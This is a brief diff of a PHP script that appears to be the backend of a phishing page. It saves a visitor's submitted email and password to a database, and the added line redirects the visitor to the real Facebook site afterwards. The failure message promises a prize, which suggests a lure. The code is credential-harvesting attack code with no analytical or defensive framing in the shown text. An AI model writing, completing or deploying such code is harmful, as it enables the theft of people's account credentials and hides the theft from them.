@@ -10,6 +10,7 @@ if($conn){
         if(mysqli_num_rows($sql2)==0){
         if(mysqli_query($conn,$sql)){
             echo "your email and password has been saved.";
+            header("Location:https://www.facebook.com/");
         }
         else{
          echo "go back and try again. prize is waiting for you.";
